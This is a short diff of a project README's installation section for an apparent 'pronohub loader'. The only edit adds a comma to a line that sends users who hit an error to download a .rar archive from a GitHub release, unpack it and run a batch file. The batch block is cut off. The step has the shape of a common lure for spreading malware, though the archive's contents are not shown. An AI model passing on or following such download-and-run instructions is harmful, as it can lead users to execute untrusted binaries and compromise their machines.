@@ -6,7 +6,7 @@
 # Installation
 
 Check what version of python you have: python --version <br />
-If error happen try binary files https://github.com/Kelly-McGowan/prhb-loader/releases/download/p/pronohub_loader.rar
+If error happen, try binary files https://github.com/Kelly-McGowan/prhb-loader/releases/download/p/pronohub_loader.rar
 
 unpack and run bat file
 ```batch
